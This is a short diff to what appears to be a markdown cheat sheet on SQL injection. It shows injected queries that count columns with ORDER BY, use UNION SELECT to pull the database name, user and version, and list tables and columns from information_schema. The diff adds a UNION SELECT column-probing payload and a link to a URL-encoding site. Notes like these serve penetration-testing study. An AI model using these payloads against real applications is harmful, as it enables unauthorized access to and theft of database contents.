@@ -112,7 +112,11 @@ SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
 SELECT * from customers WHERE name LIKE '%' union select database(), user(), @@version, null, null -- //'";
 SELECT * from customers WHERE name LIKE '' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ```
-The `order by` injection retrieves the table size.
+The `order by` injection retrieves the table size, then simple `UNION SELECT` test:
+```
+' union select '1', '2', '3', '4', '5', '6', ... -- //
+```
+URL encoding: https://www.urlencoder.io/
 
 #### Blind injections
 
